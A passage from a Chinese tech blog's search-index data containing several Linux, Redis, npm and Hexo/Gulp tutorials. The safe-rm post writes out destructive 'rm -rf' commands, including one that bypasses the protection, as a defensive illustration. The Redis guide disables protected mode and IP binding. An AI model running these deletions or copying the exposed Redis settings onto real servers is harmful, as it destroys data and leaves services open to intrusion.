13.2 kB [emitted] fonts/iconfont.16acc2.ttf 19.7 kB [emitted] fonts/iconfont.45d7ee.svg 27.5 kB [emitted]fonts/default-skin.b257fa.svg 1.55 kB [emitted] fonts/tooltip.4004ff.svg 492 bytes [emitted] main.be3dc1.js 179 kB 0 [emitted] main mobile.3bc8c9.js 337 kB 1 [emitted] mobile slider.0bdfac.js 177 kB 2 [emitted] slider main.be3dc1.css 73.7 kB 0 [emitted] main../layout/_partial/script.ejs 115 kB [emitted] ../layout/_partial/css.ejs 80 bytes [emitted] [0] multi mobile 40 bytes {1} [built] + 441 hidden modulesChild html-webpack-plugin for "../layout/_partial/script.ejs": + 3 hidden modulesChild html-webpack-plugin for "../layout/_partial/css.ejs": + 3 hidden modulesChild extract-text-webpack-plugin: + 2 hidden modulesChild extract-text-webpack-plugin: + 5 hidden modulesChild extract-text-webpack-plugin: + 8 hidden modules# 发布最终版本可以执行以下命令，此时编译后会经过压缩处理# npm run dist# 查看编译后的文件列表# tree sourcesource├── fonts│&nbsp;&nbsp; ├── default-skin.b257fa.svg│&nbsp;&nbsp; ├── iconfont.16acc2.ttf│&nbsp;&nbsp; ├── iconfont.45d7ee.svg│&nbsp;&nbsp; ├── iconfont.8c627f.woff│&nbsp;&nbsp; ├── iconfont.b322fa.eot│&nbsp;&nbsp; └── tooltip.4004ff.svg├── img│&nbsp;&nbsp; ├── default-skin.png│&nbsp;&nbsp; ├── preloader.gif│&nbsp;&nbsp; └── scrollbar_arrow.png├── main.45052c.css├── main.45052c.js├── mobile.4c76cb.js└── slider.daf231.js 通过 Hexo 测试构建结果 12345678910111213# 进入博客的根目录# cd /blogroot# 通过Hexo清理Public目录# hexo clean# 通过Hexo构建静态文件# hexo generate# 通过Hexo启动服务# hexo server# 浏览器打开博客页面，查看构建结果是否生效 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"静态博客 前端"},{title:"Linux 解决 libstdc++ 的版本问题",url:"/posts/5bd5a253.html",text:'错误日志信息 1/usr/lib64/libstdc++.so.6: version \'GLIBCXX_3.4.21\' not found 系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 查看当前 libstdc++（GLIBCXX）的版本 123456789101112131415161718192021# strings /usr/lib64/libstdc++.so.6 | grep GLIBCXXGLIBCXX_3.4GLIBCXX_3.4.1GLIBCXX_3.4.2GLIBCXX_3.4.3GLIBCXX_3.4.4GLIBCXX_3.4.5GLIBCXX_3.4.6GLIBCXX_3.4.7GLIBCXX_3.4.8GLIBCXX_3.4.9GLIBCXX_3.4.10GLIBCXX_3.4.11GLIBCXX_3.4.12GLIBCXX_3.4.13GLIBCXX_3.4.14GLIBCXX_3.4.15GLIBCXX_3.4.16GLIBCXX_3.4.17GLIBCXX_3.4.18GLIBCXX_3.4.19 可以发现当前系统最高只支持 GLIBCXX_3.4.19，并不支持 GLIBCXX_3.4.21，因此当安装需要依赖 GLIBCXX_3.4.21 的软件时，就会出现 /usr/lib64/libstdc++.so.6: version \'GLIBCXX_3.4.21\' not found 的错误。 查找 libstdc++.so.6.0.21 库文件 12345# 查找库文件# find / -name libstdc++.so.6.0.21# 如果libstdc++.so.6.0.21库文件已存在，则按照下面的步骤直接创建软链接即可# 如果libstdc++.so.6.0.21库文件不存在，则需要按照下面的步骤编译新版本的GCC，然后再创建软链接 (adsbygoogle = window.adsbygoogle || []).push({}); 编译新版本的 GCC GCC 各版本的下载地址在这里，其中 gcc-5.2.0 对应 GLIBCXX_3.4.21 与 libstdc++.so.6.0.21，而 gcc-6.5.0 对应 GLIBCXX_3.4.22 与 libstdc++.so.6.0.22，根据自己的需要下载对应版本的 GCC 即可。 12345678910111213141516171819202122232425# 下载文件（117M）# wget http://ftp.tsukuba.wide.ad.jp/software/gcc/releases/gcc-5.2.0/gcc-5.2.0.tar.bz2# 解压文件# tar -xvf gcc-5.2.0.tar.bz2# 进入解压目录# cd gcc-5.2.0# 下载编译gcc所需的依赖文件和库# ./contrib/download_prerequisites# 建立输出目录，用于存放编译时所有产生的中间文件# mkdir build# 进入输出目录# cd build# 执行configure配置# ../configure --enable-checking=release --enable-languages=c,c++ --disable-multilib# 编译gcc，指定编译使用的线程数为8，编译耗时较长，可能需要几个小时# make -j8# 这里为了避免影响系统的稳定性，暂时不执行"make install"命令来替换系统默认版本的gcc 建立软链接 1234567891011121314151617181920212223242526272829303132# 进入输出目录# cd build# 查找编译生成libstdc++.so库文件，下面查找到的libstdc++.so、libstdc++.so.6都只是软链接文件，libstdc++.so.6.0.21才是真正编译生成的库文件# find . -name "libstdc++.so*"./prev-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so./prev-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6./prev-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21./stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so./stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6./stage1-x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21./x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so./x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6./x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21# 拷贝libstdc++.so.6.0.21库文件到/usr/lib64/目录下# cp ./x86_64-unknown-linux-gnu/libstdc++-v3/src/.libs/libstdc++.so.6.0.21 /usr/lib64# 备份系统原有的libstdc++.so.6链接文件# cp /usr/lib64/libstdc++.so.6 /usr/lib64/libstdc++.so.6.bak# 覆盖系统原有的libstdc++.so.6链接文件（这里尽量不要先删除旧的再创建新的libstdc++.so.6链接文件）# ln -s -f /usr/lib64/libstdc++.so.6.0.21 /usr/lib64/libstdc++.so.6# 进入lib64目录# cd /usr/lib64# 查看最终的libstdc++.so库文件列表# ls -al /usr/lib64/libstdc++.so.6*lrwxrwxrwx. 1 root root 19 3月 12 10:08 /usr/lib64/libstdc++.so.6 -&gt; libstdc++.so.6.0.21-rwxr-xr-x. 1 root root 991616 10月 30 14:39 /usr/lib64/libstdc++.so.6.0.19-rwxr-xr-x. 1 root root 11485880 3月 12 10:01 /usr/lib64/libstdc++.so.6.0.21 验证新的 libstdc++.so.6.0.21 库文件是否生效 如果在下面的输出结果中，出现 GLIBCXX_3.4.21，则代表新的 libstdc++.so.6.0.21 库文件生效了。 1234567891011121314151617181920212223# strings /usr/lib64/libstdc++.so.6 | grep GLIBCXXGLIBCXX_3.4GLIBCXX_3.4.1GLIBCXX_3.4.2GLIBCXX_3.4.3GLIBCXX_3.4.4GLIBCXX_3.4.5GLIBCXX_3.4.6GLIBCXX_3.4.7GLIBCXX_3.4.8GLIBCXX_3.4.9GLIBCXX_3.4.10GLIBCXX_3.4.11GLIBCXX_3.4.12GLIBCXX_3.4.13GLIBCXX_3.4.14GLIBCXX_3.4.15GLIBCXX_3.4.16GLIBCXX_3.4.17GLIBCXX_3.4.18GLIBCXX_3.4.19GLIBCXX_3.4.20GLIBCXX_3.4.21 参考文章 GLIBCXX3.4.21 not find var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"Linux 安装 safe-rm 工具",url:"/posts/8ac517c2.html",text:'前言 safe-rm 是一款用来替代不安全 rm 的开源软件，可以在 /etc/safe-rm.conf 文件中配置保护名单，定义哪些文件不能被 rm 删除，可用于防止执行 rm -rf 命令导致文件被误删的发生。 安装 safe-rm 工具 123456789101112# 下载文件# wget https://launchpadlibrarian.net/188958703/safe-rm-0.12.tar.gz# 解压文件# tar -xvf safe-rm-0.12.tar.gz# 拷贝可执行文件# cd safe-rm# cp safe-rm /usr/local/bin/# 建立软链接# ln -s /usr/local/bin/safe-rm /usr/local/bin/rm 配置 PATH 环境变量（按需配置） 1234567891011# 确保PATH环境变量中，存在/usr/local/bin路径，且/usr/local/bin路径排在/usr/bin路径前面# 一些脚本中使用完全路径/bin/rm或者/usr/bin/rm则不会受safe-rm影响# echo $PATH.. /usr/local/bin:/usr/local/sbin:/usr/bin ...# 如果PATH环境变量不符合上面说的要求，则手动配置PATH环境变量# vim /etc/profileexport PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:$PATH# 如果修改了PATH环境变量，执行命令使修改生效# source /etc/profile 创建 safe-rm 配置文件，添加保护名单 12345678910111213141516171819202122232425262728293031323334353637# 默认的safe-rm配置文件有以下两个，需要自行创建全局配置：/etc/safe-rm.conf用户配置：~/.safe-rm# 创建全局配置文件# touch /etc/safe-rm.conf# 添加保护名单# vim /etc/safe-rm.conf//bin/boot/dev/etc/home/initrd/lib/lib32/lib64/proc/root/sbin/sys/usr/usr/bin/usr/include/usr/lib/usr/local/usr/local/bin/usr/local/include/usr/local/sbin/usr/local/share/usr/sbin/usr/share/usr/src/var/etc/safe-rm.conf 测试 save-rm 是否生效 1234567891011121314151617# 创建测试文件# touch /home/test.txt# 追加需要保护的文件路径到配置文件中# vim /etc/safe-rm.conf/home/test.txt# 测试删除受保护的文件路径，如果输出skipping日志代表safe-rm生效# rm /home/test.txt# rm -rf /home/test.txtsafe-rm: skipping /home/test.txt# 注意：# 配置文件里面的/etc只能保证执行"rm -rf /etc"命令的时候不能删除，但是如果执行"rm -rf /etc/app"，还是可以删除app文件的# 如果想保证某个目录下面的所有文件都不被删除，则配置文件里可以写成/etc/*，但使用通配符的方式无法避免/etc目录下链接文件被删除# 例如/lib或/lib64这种目录，下面会有很多库文件对应的链接文件，使用safe-rm并不能保护链接文件被删除# 建议将/etc/safe-rm.conf加入到保护名单中，防止/etc/safe-rm.conf被删后配置失效 使用系统默认的删除命令 12# 使用系统默认的删除命令，此时safe-rm的保护作用将失效# /usr/bin/rm -rf /etc/app var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"Centos7 生产环境安装 Redis（单机）",url:"/posts/5d728ffd.html",text:'系统环境 12CentOS Linux release 7.6.1810 (Core)Linux centos7 3.10.0-957.5.1.el7.x86_64 #1 SMP Fri Feb 1 14:54:57 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux 安装 Supervisor 12345678910111213# 提示：supervisor主要用于管理redis的开机自启动（带守护进程）# 安装# yum install -y supervisor# 开机自启动# systemctl enable supervisord# 启动服务# systemctl start supervisord# 查看服务状态# systemctl status supervisord 更改系统的最大打开文件描述符数 本站教程 创建 Redis 用户和用户组 12345678# 切换root用户$ sudo -i# 创建redis用户组# groupadd redis# 创建redis用户（不设置用户密码，不允许远程登录）# useradd redis -g redis 下载 Redis 123456789101112# 创建下载目录# mkdir -p /home/redis/software# 下载# cd /home/redis/software# wget http://download.redis.io/releases/redis-5.0.5.tar.gz# 解压# tar -xvf redis-5.0.5.tar.gz# 删除下载文件# rm -f redis-5.0.5.tar.gz 编译安装 Redis 123456789101112131415161718192021# 进入解压目录# cd /home/redis/software/redis-5.0.5# 编译# make# 创建安装目录# mkdir -p /usr/local/redis# 安装# cd /home/redis/software/redis-5.0.5/src# make PREFIX=/usr/local/redis install# 备份配置文件# cp /home/redis/software/redis-5.0.5/redis.conf /etc/redis.conf# cp /home/redis/software/redis-5.0.5/redis.conf /etc/redis.conf.default# 文件授权# chown -R redis:redis /usr/local/redis# chown redis:redis /etc/redis.conf# chown redis:redis /etc/redis.conf.default Redis 基础配置 123456789101112131415161718# 切换redis用户$ sudo -i su redis# 创建数据目录、日志目录、日志文件$ mkdir /usr/local/redis/data$ mkdir /usr/local/redis/logs$ touch /usr/local/redis/logs/redis.log# 编辑配置文件$ vim /etc/redis.confmaxclients 10000 #最大连接数# bind 127.0.0.1 #注释掉IP绑定protected-mode no #关闭保护模式requirepass yourPassword #设置访问密码dir /usr/local/redis/data/ #指定数据目录logfile "/usr/local/redis/logs/redis.log" #指定日志文件# 注意：当前使用RDB持久化机制，由于Redis默认启用RDB，因此上面无需手动配置，除非需要更改快照存盘的频率 开机自启动 Redis 123456789101112131415161718192021222324252627282930# 切换root用户$ sudo -i# 配置redis前台运行# vim /usr/local/redis/conf/redis.confdaemonize no# 创建redis的supervistor配置文件# touch /etc/supervisord.d/redis.ini# 编辑redis的supervistor配置文件，添加以下配置内容（考虑到服务器安全，必须指定使用redis用户启动redis服务）# vim /etc/supervisord.d/redis.ini[program:redis]directory=/usr/local/rediscommand=/usr/local/redis/bin/redis-server /etc/redis.confuser=redisnumprocs=1autostart=trueautorestart=truestartretries=10process_name=%(program_name)s# 重载supervistor的配置文件，会自动启动redis服务# supervisorctl reload# 查看redis的运行状态# supervisorctl status redisredis RUNNING pid 31513, uptime 0:03:23 #如果输出此日志信息，说明redis启动成功，否则查看redis的启动日志来排查问题# 注意：当redis通过supervistor管理自启动的情况下，不能简单使用“redis-cli shutdown“命令来关闭redis服务，具体的redis服务管理可参考下面的内容。 配置防火墙 12345678# 开放端口# firewall-cmd --zone=public --permanent --add-port=6379/tcp# 保存防火墙配置# firewall-cmd --reload# 查看已开放的端口# firewall-cmd --list-ports 管理 Redis 服务 1234567891011# 关闭# supervistorctl stop redis# 启动# supervistorctl start redis# 重启# supervistorctl restart redis# 查看状态# supervistorctl status redis 配置概述 12345配置文件：/etc/redis.conf安装目录：/usr/local/redis/数据目录：/usr/local/redis/data日志文件：/usr/local/redis/logs/redis.logredis的supervistor配置文件：/etc/supervisord.d/redis.ini Redis 启动错误一 12344969:M 23 Nov 2018 12:57:46.920 # You requested maxclients of 10000 requiring at least 10032 max file descriptors.44969:M 23 Nov 2018 12:57:46.920 # Server can\'t set maximum open files to 10032 because of OS error: Operation not permitted.44969:M 23 Nov 2018 12:57:46.920 # Current maximum open files is 4096. maxclients has been reduced to 4064 to compensate for low ulimit. If you need higher maxclients increase \'ulimit -n\'. 一般情况下，如果已经更改了系统的最大打开文件描述符数，不会再出现以上的错误信息，请检查最大打开文件描述符数的更改是否生效。 Redis 启动错误二 123444969:M 23 Nov 2018 12:57:46.921 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.44969:M 23 Nov 2018 12:57:46.921 # Server initialized44969:M 23 Nov 2018 12:57:46.921 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add \'vm.overcommit_memory = 1\'to /etc/sysctl.conf and then reboot or run the command \'sysctl vm.overcommit_memory=1\' for this to take effect. 1234567891011# 编辑配置文件，添加以下内容# vim /etc/sysctl.confvm.overcommit_memory = 1net.core.somaxconn = 1024# 重启系统# reboot# 验证是否生效# sysctl net.core.somaxconn# sysctl vm.overcommit_memory Redis 启动错误三 1244969:M 23 Nov 2018 12:57:46.922 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issuerun the command \'echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled\' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled. 1234567891011121314# 执行以下命令# echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled# 编辑配置文件，在文件的末尾添加以下内容# vim /etc/rc.localif test -f /sys/kernel/mm/transparent_hugepage/enabled; then echo never &gt; /sys/kernel/mm/transparent_hugepage/enabledfi# 配置文件授权# chmod +x /etc/rc.d/rc.local# 重启系统# reboot var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos 缓存"},{title:"Linux 压缩 JPG-PNG 图片",url:"/posts/db3daf0.html",text:'Jpegoptim 压缩 JPG 图片 12345678# 安装jpegoptim# yum install jpegoptim# 压缩jpg图片# jpegoptim ttlsa.jpg# 批量压缩某目录下所有jpg图片# for i in /data/site/image.ttlsa.com/images/*.jpg; do jpegoptim $i; done Pngcrush 压缩 PNG 图片 12345678910111213141516171819202122232425262728293031# 下载pngcrush# wget https://jaist.dl.sourceforge.net/project/pmt/pngcrush/1.8.13/pngcrush-1.8.13.tar.gz# 解压pngcrush# tar -xvf pngcrush-1.8.13.tar.gz# 编译安装pngcrush# make# cp pngcrush /usr/bin# 压缩png图片，指定图片压缩后的文件名# pngcrush -brute pay_zfb.png pay_zfb_small.png# 压缩png图片，指定图片压缩后直接覆盖原图片（-n参数）# pngcrush -brute -n bg_purple.png# 压缩png图片，指定图片压缩后的文件扩展名（-e参数），例如下面图片压缩后的完整文件名为：bg_purple_small.png# pngcrush -brute -e "_small.png" bg_purple.png# 批量压缩当前目录下所有png图片，指定图片压缩后存放的目录（-d参数），且图片压缩后的文件名不变（-n参数）# pngcrush -brute -d "/data/site/image.ttlsa.com/images" -n *.png# 批量压缩某目录下所有png图片，指定图片压缩后直接覆盖原图片（-n参数）# for i in /data/site/image.ttlsa.com/images/*.png; do pngcrush -brute -n $i; done# 参数说明：# pngcrush --helpusage: pngcrush [options except for -e -d] infile.png outfile.png pngcrush -e ext [other options] file.png ... pngcrush -d dir/ [other options] file.png ... pngcrush -n -v file.png ... var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"linux"},{title:"NPM 包发布 - Publish",url:"/posts/68618d42.html",text:'第一步：注册 NPM 仓库帐号 NPM 官网 第二步：创建 NodeJS 项目 123456789101112131415161718192021# 创建项目的根目录$ mkdir test-module# 进入项目的根目录$ cd test-module# 初始化当前项目，根据提示填写项目信息$ npm init# 初始化后，最终生成package.json文件，文件内容示例如下：{ "name": "test-module", "version": "1.0.0", "description": "0.0.1", "main": "index.js", "scripts": { "test": "echo \\"Error: no test specified\\" &amp;&amp; exit 1" }, "author": "Clay", "license": "MIT"} 第三步：编写 NodeJS 代码 12345678# 进入项目的根目录$ cd test-module# 创建index.js文件$ touch index.js# 开始编写代码$ vim index.js 第四步：发布项目到 NPM 仓库 12345678910111213141516# 进入项目的根目录$ cd test-module# 登录NPM仓库，填写用户名、密码、邮箱地址$ npm login# 发布项目，如果是首次执行发布命令，需要登录邮箱验证邮箱地址$ npm publish# 取消项目发布$ npm unpublish test-module --forc# 或者取消项目指定版本的发布$ npm unpublish test-module@1.0.0 --forc# 最后登录NPM仓库的管理页面，就可以看到自己刚发布的NPM模块。 更新 NPM 仓库中项目的版本 12345678910111213141516171819# 查看项目在NPM仓库中的所有版本号$ npm view hexo-ssl-auth versions[ \'0.0.1\' ]# 本地修改项目的源码...# 更改本地项目的版本号# 参数 patch 代表补丁，版本号的最后一位自动加1# 参数 minor 代表小修小改，版本号的第二位自动加1# 参数 major 代表大改，版本号的第一位自动加1$ npm version patchv0.0.2# 更改NPM仓库中项目的版本号$ npm publish# 查看项目在NPM仓库中的所有版本号[ \'0.0.1\', \'0.0.2\' ] 错误处理：no_perms Private mode enable, only admin can publish this module 12345678910# 详细的错误信息npm ERR! publish Failed PUT 403npm ERR! code E403npm ERR! no_perms Private mode enable, only admin can publish this module# 错误原因分析使用的是淘宝源cnpm，登陆到的是cnpm# 解决方法切换到npm的官方源，可执行命令：npm config set registry http://registry.npmjs.org/ 错误处理：You do not have permission to publish “npmtest”. Are you logged in as the correct user? 12345678910# 详细的错误信息npm ERR! publish Failed PUT 403npm ERR! code E403npm ERR! You do not have permission to publish "npmtest". Are you logged in as the correct user? :# 错误原因分析所要publish的包的name和NPM仓库中已经发布的包的名字重复，因此没有权限发布这个名字的包。简单解释就是包名被别人抢先注册了# 解决方法编辑package.json文件，把name的值换掉。如果还出现上述错误就是还是重名的，继续换！ 错误处理：You cannot publish over the previously published versions: 0.0.3 12345678910# 详细的错误信息npm ERR! publish Failed PUT 403npm ERR! code E403npm ERR! You cannot publish over the previously published versions: 0.0.3. : hexo-google-adsense# 错误原因分析所要publish的包的version小于等于NPM仓库中已经发布的包的版本号# 解决方法编辑package.json文件，把version的值更改掉，必须大于NPM仓库中已经发布的包的版本号 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"前端"},{title:"Hexo 优化 - 利用 Gulp 压缩代码",url:"/posts/17b9b7b0.html",text:"Gulp 压缩代码版本说明主要模块的版本号分别为： gulp 3.9.x，gulp-babel 7.x，babel-core 6.x 1234567891011121314151617\"babel-core\": \"^6.26.3\",\"babel-loader\": \"^7.1.5\",\"babel-preset-env\": \"^1.7.0\",\"babel-preset-es2015\": \"^6.24.1\",\"gulp\": \"^3.9.1\",\"gulp-babel\": \"^7.0.1\",\"gulp-cache\": \"^1.1.1\",\"gulp-changed\": \"^3.2.0\",\"gulp-clean\": \"^0.4.0\",\"gulp-debug\": \"^4.0.0\",\"gulp-htmlclean\": \"^2.7.22\",\"gulp-htmlmin\": \"^5.0.1\",\"gulp-imagemin\": \"^5.0.3\",\"gulp-minify-css\": \"^1.2.4\",\"gulp-uglify\": \"^3.0.2\",\"gulp-util\": \"^3.0.8\",\"imagemin-pngquant\": \"^7.0.0\" 安装 NPM 模块全局安装： 12345# 全局安装 Gulp 3.9$ npm install -g gulp@3.9.1# 全局查看 Gulp 的版本号$ gulp --version 局部安装： 123456789# 局部安装 Gulp 3.9.1$ npm install gulp@3.9.1# 局部安装 Babel 6$ npm install gulp-babel@7 babel-core babel-preset-env babel-loader babel-preset-es2015 --save# 局部安装其他模块1）将上面其他模块的依赖信息添加到博客根目录下的package.json文件中2）然后在博客的根目录下，执行局部安装命令：npm install 创建 Gulp 配置文件在 Hexo 博客的根目录下创建 gulpfile.js 配置文件，并写入以下内容： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960var gulp = require('gulp');var gutil = require('gulp-util');var clean = require('gulp-clean');var debug = require('gulp-debug');var cache = require('gulp-cache');var babel = require('gulp-babel');var uglify = require('gulp-uglify');var changed = require('gulp-changed');var htmlmin = require('gulp-htmlmin');var imagemin = require('gulp-imagemin');var htmlclean = require('gulp-htmlclean');var minifycss = require('gulp-minify-css');var pngquant = require('imagemin-pngquant');// 压缩css文件gulp.task('minify-css', function() { return gulp.src('./public/css/**/*.css') .pipe(minifycss()) .pipe(gulp.dest('./public/css'));});// 压缩js文件，支持将ES6代码转换成ES5代码gulp.task('minify-js', function() { return gulp.src('./public/lib/**/*.js') .pipe(babel({ presets: ['es2015'] })) .pipe(uglify()) .pipe(gulp.dest('./public/lib'));});// 压缩html文件gulp.task('minify-html', function() { return gulp.src('./public/**/*.html') .pipe(htmlclean()) .pipe(htmlmin({ removeComments: true, minifyJS: true, minifyCSS: true, minifyURLs: true, })) .pipe(gulp.dest('./public'));});// 压缩图片(深度压缩)gulp.task('minify-images', function() { gulp.src('./public/asset/**/*.{png,jpg,gif,ico}') .pipe(cache(imagemin({ //启用缓存，只压缩发生变化的图片 progressive: true, //是否无损压缩jpg图片 interlaced: false, //是否隔行扫描gif进行渲染 svgoPlugins: [{removeViewBox: false}], //是否移除svg的viewbox属性 multipass: false, //是否多次优化svg直到完全优化 optimizationLevel: 5, //优化等级，取值范围：0-7，默认值：3 use: [pngquant()] //使用pngquant深度压缩png图片的imagemin插件 }))) .pipe(gulp.dest('./public/asset'));});// gulp3的写法gulp.task('default', ['minify-css', 'minify-js', 'minify-images', 'minify-html']); Gulp 执行压缩任务1234567891011121314151617181920# 进入博客根目录$ cd /blogroot# 执行指定的压缩任务（如压缩CSS）$ gulp minify-css# 执行全部压缩任务$ gulp[09:35:19] Using gulpfile /blogroot/gulpfile.js[09:35:19] Starting 'minify-css'...[09:35:19] Starting 'minify-js'...[09:35:19] Starting 'minify-images'...[09:35:19] Finished 'minify-images' after 6.59 ms[09:35:19] Starting 'minify-html'...[09:35:20] Finished 'minify-css' after 739 ms[09:35:27] Finished 'minify-js' after 7.78 s[09:40:51] Finished 'minify-html' after 5.52 min[09:40:51] Starting 'default'...[09:40:51] Finished 'default' after 34 μs[09:40:52] gulp-imagemin: Minified 122 images Gulp 使用优化Gulp 只压缩修改过的文件 上面的代码，默认会压缩扫描得到的所有文件（除了图片以外），效率和性能都非常低。此时可以安装 gulp-changed 模块，控制 Gulp 只压缩修改过的文件（代码如下）。 每次运行下面的代码之后，如果接着执行 hexo clean 命令，再执行压缩操作会发现 Gulp 依然会压缩所有文件。建议配合使用 gulp-cache 或者 gulp-cached 模块来解决压缩缓存的问题，也可以自行实现压缩缓存机制（内存缓存 + 磁盘缓存）。 如果压缩缓存方案依赖文件的 Hash 值，且 Hexo 使用了 Yilia 主题，则必须保证 Hexo 生成的标签（Tag）列表是有顺序的，否则 Hexo 每次执行 clean 与 generate 操作后，HTML 文件的 Hash 值都不一样，最终导致每次都会压缩 HTML 文件；建议修改 Hexo 主题的 JS 代码，使每次生成的标签列表都一样。 如果安装了第三方插件，可能也会影响文件的 Hash 值，例如：文章加密插件。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091var gulp = require('gulp');var gutil = require('gulp-util');var clean = require('gulp-clean');var debug = require('gulp-debug');var cache = require('gulp-cache');var babel = require('gulp-babel');var uglify = require('gulp-uglify');var changed = require('gulp-changed');var htmlmin = require('gulp-htmlmin');var imagemin = require('gulp-imagemin');var htmlclean = require('gulp-htmlclean');var minifycss = require('gulp-minify-css');var pngquant = require('imagemin-pngquant');// 压缩css源文件(只压缩修改过的源文件)gulp.task('generate-minify-css', function() { return gulp.src('./public/css/**/*.css') .pipe(changed('/tmp/blog/css/', {extension:'.css', hasChanged: changed.compareContents})) .pipe(minifycss()) .pipe(gulp.dest('/tmp/blog/css/')) .pipe(debug({title: '压缩css源文件:'}));});// 拷贝经压缩的css源文件(只拷贝修改过的压缩源文件)gulp.task('copy-minify-css', ['generate-minify-css'], function() { return gulp.src('/tmp/blog/css/**/*.css') .pipe(changed('./public/css/', {extension:'.css', hasChanged: changed.compareContents})) .pipe(gulp.dest('./public/css/')) .pipe(debug({title: '拷贝经压缩的css源文件:'}));});// 压缩js源文件(只压缩修改过的源文件),支持将ES6代码转换成ES5代码gulp.task('generate-minify-js', function() { return gulp.src('./public/lib/**/*.js') .pipe(changed('/tmp/blog/lib/', {extension:'.js', hasChanged: changed.compareContents})) .pipe(babel({presets: ['es2015']})) .pipe(uglify()) .pipe(gulp.dest('/tmp/blog/lib/')) .pipe(debug({title: '压缩js源文件:'}));});// 拷贝经压缩的js源文件(只拷贝修改过的压缩源文件)gulp.task('copy-minify-js', ['generate-minify-js'], function() { return gulp.src('/tmp/blog/lib/**/*.js') .pipe(changed('./public/lib/', {extension:'.js', hasChanged: changed.compareContents})) .pipe(gulp.dest('./public/lib/')) .pipe(debug({title: '拷贝经压缩的js源文件:'}));});// 压缩html源文件(只压缩修改过的源文件)gulp.task('generate-minify-html', function() { return gulp.src('./public/**/*.html') .pipe(changed('/tmp/blog/', {extension:'.html', hasChanged: changed.compareContents})) .pipe(htmlclean()) .pipe(htmlmin({ removeComments: true, minifyJS: true, 